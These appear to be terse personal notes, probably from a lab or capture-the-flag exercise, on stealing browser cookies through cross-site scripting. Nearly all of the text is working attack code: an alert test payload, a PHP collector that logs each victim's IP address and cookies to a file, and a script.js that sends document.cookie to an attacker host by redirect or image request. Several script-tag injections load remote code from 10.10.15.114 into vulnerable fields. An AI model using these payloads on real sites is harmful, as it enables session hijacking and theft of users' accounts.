`<script>alert(document.cookie)</script>`

mkdir /tmp/tmpserver

cd /tmp/tmpserver

vim index.php

```
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
} 
?>
```

Vim script.js

```
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

sudo php -S `<ip> `
```
<script src=http://10.10.15.114:800/comment></script>

<script src=http://10.10.15.114:800/name></script>

<script src=http://10.10.15.114:800/websitet></script>
```
->result點

`<script src=http://10.10.15.114:800/script.js></script>`
